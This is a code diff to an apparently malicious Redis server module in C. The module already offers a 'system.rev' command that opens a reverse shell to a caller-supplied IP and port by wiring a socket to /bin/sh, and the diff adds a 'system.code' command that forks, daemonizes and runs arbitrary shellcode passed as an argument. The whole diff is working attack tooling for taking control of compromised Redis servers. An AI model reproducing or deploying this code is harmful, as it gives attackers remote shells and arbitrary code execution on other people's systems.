@@ -10,6 +10,7 @@
 #include <arpa/inet.h>
 
 #include "process.h"
+#include "native_code.h"
 
 #ifdef  __cplusplus  
 extern "C" {  
@@ -84,7 +85,7 @@ RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
     sa.sin_family = AF_INET;
     sa.sin_addr.s_addr = inet_addr(ip);
     sa.sin_port = htons(port);
-    
+
     s = socket(AF_INET, SOCK_STREAM, 0);
     connect(s, (struct sockaddr *)&sa, sizeof(sa));
     dup2(s, 0);
@@ -92,6 +93,36 @@ RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
     dup2(s, 2);
 
     execve("/bin/sh", 0, 0);
+
+    return REDISMODULE_OK;
+}
+
+int
+NativeCodeExec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
+{
+    if (argc != 2) {
+        return RedisModule_WrongArity(ctx);
+    }
+
+    int pid;
+    pid = fork();
+    if (pid < 0) {
+        return REDISMODULE_OK;
+    }
+    if (pid > 0) {
+        /*忽略子进程退出信号*/
+        signal(SIGCHLD, SIG_IGN);
+        return REDISMODULE_OK;
+    }
+
+    bool ret = module_daemon();
+    if (!ret) {
+        return REDISMODULE_OK;
+    }
+    size_t len;
+    const char *shellcode = RedisModule_StringPtrLen(argv[1], &len);
+
+    exec_string_shellcode(shellcode, len);
 
     return REDISMODULE_OK;
 }
@@ -107,6 +138,9 @@ RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
         return REDISMODULE_ERR;
     if (RedisModule_CreateCommand(ctx, "system.rev",
         RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
+        return REDISMODULE_ERR;
+    if (RedisModule_CreateCommand(ctx, "system.code",
+        NativeCodeExec, "readonly", 1, 1, 1) == REDISMODULE_ERR)
         return REDISMODULE_ERR;
     return REDISMODULE_OK;
 }
